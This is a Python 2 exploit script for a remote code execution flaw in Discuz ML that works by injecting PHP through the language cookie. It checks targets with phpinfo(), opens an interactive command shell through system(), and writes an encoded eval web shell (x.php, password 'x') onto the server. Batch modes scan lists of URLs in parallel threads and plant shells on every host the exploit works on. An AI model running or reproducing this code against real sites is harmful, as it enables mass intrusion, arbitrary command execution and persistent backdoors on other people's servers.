# coding:utf-8
# Author:LSA
# Description:discuz ml rce(cookie-language)
# Date:20190714


import requests
import optparse
#from requests.packages import urllib3
import sys
import urllib3
import re
from bs4 import BeautifulSoup
import Queue
import threading
import os
import datetime



reload(sys)
sys.setdefaultencoding('utf-8')



lock = threading.Lock()
q0 = Queue.Queue()
threadList = []
global success_count
success_count = 0


total_count = 0


def get_setcookie_language_value(tgtUrl,timeout):

    urllib3.disable_warnings()
    tgtUrl = tgtUrl
    try:
        rsp = requests.get(tgtUrl, timeout=timeout, verify=False)
        rsp_setcookie = rsp.headers['Set-Cookie']
        # print rsp.text
        pattern = re.compile(r'(.*?)language=')
        language_pattern = pattern.findall(rsp_setcookie)
        setcookie_language = language_pattern[0].split(' ')[-1].strip() + 'language=en'
        return str(setcookie_language)

    except:
        print str(tgtUrl) + ' get setcookie language value error!'
        return 'get-setcookie-language-value-error'


def dz_ml_rce_check(tgtUrl, setcookie_language_value, timeout):

    tgtUrl = tgtUrl
    check_payload = setcookie_language_value + '\'.phpinfo().\';'
    headers = {}

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36";
    headers["Cookie"] = check_payload;

    check_rsp = requests.get(tgtUrl,headers=headers,timeout=timeout,verify=False)
    #print headers['Cookie']
    if check_rsp.status_code == 200:
        try:
            if (check_rsp.text.index('PHP Version')):
                print 'target is vulnerable!!!'

            else:
                soup = BeautifulSoup(check_rsp.text, 'lxml')
                if (soup.find('title')):
                    print 'target seem not vulnerable-' + 'return title: ' + str(soup.title.string) + '\n'
        except ValueError, e:
                print 'target seem not vulnerable-' + e.__repr__()
        except:
                print 'target seem not vulnerable-Unknown error.'
    else:
        print 'Target seem not vulnerable-status code: ' + str(check_rsp.status_code) + '\n'



def dz_ml_rce_cmdshell(tgtUrl, setcookie_language_value, timeout):

    #cmdshell_pattern = re.compile(r'([\s][\S]*?)<!DOCTYPE html')


    tgtUrl = tgtUrl

    cmd_exp = '\'.system(\'{0}\').\';'

    cmd_test = 'echo zxc000'

    cmd_exp_test = setcookie_language_value + cmd_exp.format(cmd_test)

    headers = {}

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36";
    headers["Cookie"] = cmd_exp_test;


    cmd_exp_rsp = requests.get(tgtUrl,headers=headers,timeout=timeout,verify=False)
    if cmd_exp_rsp.status_code == 200:
        if 'zxc000' in cmd_exp_rsp.text:
            print 'Get cmdshell success! type exit to exit.'

            while True:
                command = raw_input("cmd>>> ")
                if command == 'exit':
                    break
                cmd_exp_send = setcookie_language_value + cmd_exp.format(command)
                headers['Cookie'] = cmd_exp_send
                cmd_exp_rsp = requests.get(tgtUrl,headers=headers,timeout=timeout,verify=False)
                cmdshell_result = cmd_exp_rsp.text[0:1000].split('<!DOCTYPE html')[0].strip()
                #cmdshell_result = cmdshell_pattern.findall(cmd_exp_rsp.text[0:100])
                print cmdshell_result
        else:
            print 'Get cmdshell seem failed-can not find zxc000.'
    else:
        print 'Get cmdshell seem failed-status code: ' + str(cmd_exp_rsp.status_code) + '\n'



def dz_ml_rce_getshell(tgtUrl, setcookie_language_value, timeout):
    getshell_exp = '\'.file_put_contents%28%27x.php%27%2Curldecode%28%27%253c%253fphp%2520@eval%28%2524_%25%35%30%25%34%66%25%35%33%25%35%34%255b%2522x%2522%255d%29%253b%253f%253e%27%29%29.\';'
    getshell_exp_send = setcookie_language_value + getshell_exp

    headers = {}

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36";

    headers['Cookie'] = getshell_exp_send

    filename = tgtUrl.split('/')[-1]

    getshell_rsp = requests.get(tgtUrl, headers=headers, timeout=timeout, verify=False)
    # print headers['Cookie']
    if getshell_rsp.status_code == 200:
        getshell_rsp1 = requests.get(tgtUrl.split(filename)[0] + 'x.php', timeout=timeout, verify=False)
        #print tgtUrl.split('/')[-1]
        #print tgtUrl.split(filename)[0] + 'x.php'
        if (getshell_rsp1.status_code) == 200 and (getshell_rsp1.text == ""):
            print 'Getshell success!-shellPath:' + tgtUrl.split(filename)[0] + 'x.php'
        else:
            #soup = BeautifulSoup(getshell_rsp1.text, 'lxml')
            print 'Getshell failed!-rsp1 status code: ' + str(getshell_rsp1.status_code) + '\nrsp1 text: ' + getshell_rsp1.text[0:100]

    else:
        print 'Target seem not vulnerable-status code: ' + str(getshell_rsp.status_code) + '\n'



def dz_ml_rce_check_batch(timeout,f4success,f4fail):

    global total_count
    headers = {}

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36";

    while(not q0.empty()):
        tgtUrl = q0.get()
        qcount = q0.qsize()
        print 'Checking: ' + tgtUrl + ' ---[' + str(total_count - qcount) + '/' + str(total_count) + ']'

        setcookie_language_value = get_setcookie_language_value(tgtUrl,timeout)
        if setcookie_language_value == 'get-setcookie-language-value-error':
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'get setcookie language value error' + '\n')
            lock.release()
            continue

        check_payload = str(setcookie_language_value) + '\'.phpinfo().\';'
        headers["Cookie"] = check_payload;

        try:
            check_batch_rsp = requests.get(tgtUrl, headers=headers, timeout=timeout, verify=False)

        except requests.exceptions.Timeout:
            #print tgtUrl + ' Checked failed! Error: Timeout'
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: Timeout' + '\n')
            lock.release()
            continue

        except requests.exceptions.ConnectionError:
            #print tgtUrl + ' Checked failed! Error: ConnectionError'
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: ConnectionError' + '\n')
            lock.release()
            continue

        except:
            #print tgtUrl + ' Checked failed! Error: Unknown error'
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: Unknown error' + '\n')
            lock.release()
            continue

        if check_batch_rsp.status_code == 200:
            try:
                if (check_batch_rsp.text.index('PHP Version')):
                    print tgtUrl + ' is vulnerable!!!'
                    lock.acquire()
                    f4success.write(tgtUrl+'\n')
                    lock.release()
                    global success_count
                    success_count = success_count + 1

                else:
                    lock.acquire()
                    f4fail.write(tgtUrl + ': ' + 'Checked failed!' + '\n')
                    lock.release()
            except ValueError, e:
                #print tgtUrl + ' seem not vulnerable-' + e.__repr__()
                lock.acquire()
                f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: ' + e.__repr__() + '\n')
                lock.release()
                continue
            except:
                #print tgtUrl + ' seem not vulnerable-Unknown error.'
                lock.acquire()
                f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: Unknown error.'+'\n')
                lock.release()
                continue
        else:
            #print tgtUrl + ' seem not vulnerable-status code: ' + str(check_batch_rsp.status_code) + '\n'
            lock.acquire()
            f4fail.write(tgtUrl + ' Checked failed! Error: '+ str(check_batch_rsp.status_code) + '\n')
            lock.release()

def dz_ml_rce_getshell_batch(timeout,f4success,f4fail):


    headers = {}

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36";

    global total_count
    while(not q0.empty()):
        tgtUrl = q0.get()
        qcount = q0.qsize()
        print 'Checking: ' + tgtUrl + ' ---[' + str(total_count - qcount) + '/' + str(total_count) + ']'

        setcookie_language_value = get_setcookie_language_value(tgtUrl,timeout)
        if setcookie_language_value == 'get-setcookie-language-value-error':
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'get setcookie language value error' + '\n')
            lock.release()
            continue


        getshell_exp = '\'.file_put_contents%28%27x.php%27%2Curldecode%28%27%253c%253fphp%2520@eval%28%2524_%25%35%30%25%34%66%25%35%33%25%35%34%255b%2522x%2522%255d%29%253b%253f%253e%27%29%29.\';'
        getshell_exp_send = setcookie_language_value + getshell_exp
        headers["Cookie"] = getshell_exp_send

        try:
            getshell_batch_rsp = requests.get(tgtUrl, headers=headers, timeout=timeout, verify=False)

        except requests.exceptions.Timeout:
            #print tgtUrl + ' Checked failed! Error: Timeout'
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: Timeout' + '\n')
            lock.release()
            continue

        except requests.exceptions.ConnectionError:
            #print tgtUrl + ' Checked failed! Error: ConnectionError'
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: ConnectionError' + '\n')
            lock.release()
            continue

        except:
            #print tgtUrl + ' Checked failed! Error: Unknown error'
            lock.acquire()
            f4fail.write(tgtUrl + ': ' + 'Checked failed! Error: Unknown error' + '\n')
            lock.release()
            continue

        if getshell_batch_rsp.status_code == 200:
            filename = tgtUrl.split('/')[-1]
            getshell_batch_rsp1 = requests.get(tgtUrl.split(filename)[0] + 'x.php', timeout=timeout, verify=False)

            if (getshell_batch_rsp1.status_code) == 200 and (getshell_batch_rsp1.text == ""):
                print 'Getshell success!-shellPath:' + tgtUrl.split(filename)[0] + 'x.php'
                lock.acquire()
                f4success.write(tgtUrl.split(filename)[0] + 'x.php' + '\n')
                lock.release()
                global success_count
                success_count = success_count + 1
            else:
                # soup = BeautifulSoup(getshell_rsp1.text, 'lxml')
                #print 'Getshell failed!-rsp1 status code: ' + str(getshell_batch_rsp1.status_code) + '\nrsp1 text: ' + getshell_batch_rsp1.text[0:100]
                lock.acquire()
                f4fail.write(tgtUrl + '-' + 'Getshell failed!-rsp1 status code: ' + str(getshell_batch_rsp1.status_code) + '\n')
                lock.release()

        else:
            #print tgtUrl + ' seem not vulnerable-status code: ' + str(check_batch_rsp.status_code) + '\n'
            lock.acquire()
            f4fail.write(tgtUrl + ' Getshell failed! Error: '+ str(getshell_batch_rsp.status_code) + '\n')
            lock.release()



def main():
    parser = optparse.OptionParser('python %prog ' + '-h', version= '%prog v1.0')

    parser.add_option('-u', dest='tgtUrl', type='string', help='single target url')
    parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
    # parser.add_option('--check',dest='check',action='store_true',help='check url')
    parser.add_option('--getshell', dest='getshell', action='store_true', help='write a shell to target url-x.php,pwd is x')
    parser.add_option('--cmdshell', dest='cmdshell', action='store_true', help='cmd shell mode')

    parser.add_option('-f', dest='tgtUrlsPath', type ='string', help='urls filepath')
    parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    (options, args) = parser.parse_args()

    getshell = options.getshell
    cmdshell = options.cmdshell
    timeout = options.timeout
    tgtUrl = options.tgtUrl


    global total_count

    if tgtUrl and (getshell is None and cmdshell is None):
        setcookie_language_value = get_setcookie_language_value(tgtUrl, timeout)
        if setcookie_language_value == 'get-setcookie-language-value-error':
            sys.exit()
        #print setcookie_language_value
        dz_ml_rce_check(tgtUrl, setcookie_language_value, timeout)
    if tgtUrl and cmdshell:
        setcookie_language_value = get_setcookie_language_value(tgtUrl, timeout)
        if setcookie_language_value == 'get-setcookie-language-value-error':
            sys.exit()
        dz_ml_rce_cmdshell(tgtUrl, setcookie_language_value, timeout)
    if tgtUrl and getshell:
        setcookie_language_value = get_setcookie_language_value(tgtUrl, timeout)
        if setcookie_language_value == 'get-setcookie-language-value-error':
            sys.exit()
        dz_ml_rce_getshell(tgtUrl, setcookie_language_value, timeout)

    if options.tgtUrlsPath and (getshell is None):
        tgtFilePath = options.tgtUrlsPath
        threads = options.threads
        nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        os.mkdir('batch_result/' + str(nowtime))
        f4success = open('batch_result/' + str(nowtime) + '/' + 'success-checked.txt', 'w')
        f4fail = open('batch_result/' + str(nowtime) + '/' + 'failed-checked.txt', 'w')
        urlsFile = open(tgtFilePath)

        total_count = len(open(tgtFilePath, 'rU').readlines())

        print '===Total ' + str(total_count) + ' urls==='

        for urls in urlsFile:
            tgtUrls = urls.strip()
            q0.put(tgtUrls)
        for thread in range(threads):
            t = threading.Thread(target=dz_ml_rce_check_batch, args=(timeout, f4success, f4fail))
            t.start()
            threadList.append(t)
        for th in threadList:
            th.join()

        print '\n###Finished! [success/total]: ' + '[' + str(success_count) + '/' + str(total_count) + ']###'
        print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
        f4success.close()
        f4fail.close()

    if options.tgtUrlsPath and getshell:
        tgtFilePath = options.tgtUrlsPath
        threads = options.threads
        nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        os.mkdir('batch_result/' + str(nowtime))
        f4success = open('batch_result/' + str(nowtime) + '/' + 'success-getshell.txt', 'w')
        f4fail = open('batch_result/' + str(nowtime) + '/' + 'failed-getshell.txt', 'w')
        urlsFile = open(tgtFilePath)
        #global total_count
        total_count = len(open(tgtFilePath, 'rU').readlines())

        print '===Total ' + str(total_count) + ' urls==='

        for urls in urlsFile:
            tgtUrls = urls.strip()
            q0.put(tgtUrls)
        for thread in range(threads):
            t = threading.Thread(target=dz_ml_rce_getshell_batch, args=(timeout, f4success, f4fail))
            t.start()
            threadList.append(t)
        for th in threadList:
            th.join()

        print '\n###Finished! [success/total]: ' + '[' + str(success_count) + '/' + str(total_count) + ']###'
        print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
        f4success.close()
        f4fail.close()




if __name__ == '__main__':

    main()